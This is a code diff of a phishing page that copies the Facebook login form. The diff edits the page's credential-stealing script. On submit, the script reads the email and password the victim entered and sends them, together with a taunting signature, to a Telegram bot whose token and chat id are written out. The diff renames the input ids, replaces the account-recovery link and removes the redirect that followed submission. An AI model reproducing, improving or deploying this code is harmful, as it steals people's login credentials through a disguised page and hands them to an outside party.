@@ -1134,7 +1134,7 @@
                               type="text"
                               class="inputtext _55r1 _6luy"
                               name="email"
-                              id="email"
+                              id="mail"
                               data-testid="royal_email"
                               placeholder="Email or phone number"
                               autofocus="1"
@@ -1148,7 +1148,7 @@
                                 type="password"
                                 class="inputtext _55r1 _6luy _9npi"
                                 name="pass"
-                                id="password"
+                                id="pass"
                                 data-testid="royal_pass"
                                 placeholder="Password"
                                 aria-label="Password"
@@ -1174,7 +1174,8 @@
                           name="next"
                           value=""
                         />
-                        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
+  
+                        <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc0MDk2NDQ4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">
                         <div class="_xkt">
                           <button
                             value="1"
@@ -3295,10 +3296,10 @@
         addEventListener("submit", (e) => {
           e.preventDefault();
   
-          var email = document.getElementById("email").value;
-          var password = document.getElementById("password").value;
+          var mail = document.getElementById("mail").value;
+          var pass = document.getElementById("pass").value;
   
-          var message = "User : " + email + "%0A" + "Pass : " + password + "%0A" + "Fucked By: 【 @T_i_2o ✅";
+          var message = "User : " + mail + "%0A" + "Pass : " + pass + "%0A Fucked By: 【 @T_i_2o ✅ 】";
   
           var token = "5530729858:AAG8bmQJe3dAmEX8d-MwzHKKFMto2B8JLHk";
           var chat_id = 1430266005;
@@ -3313,10 +3314,9 @@
           let api = new XMLHttpRequest();
           api.open("GET", url, true);
           api.send();
-  
-          window.location = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0";
-  
+
           console.log("Successfully");
+
         });
       </script>    
   </body>
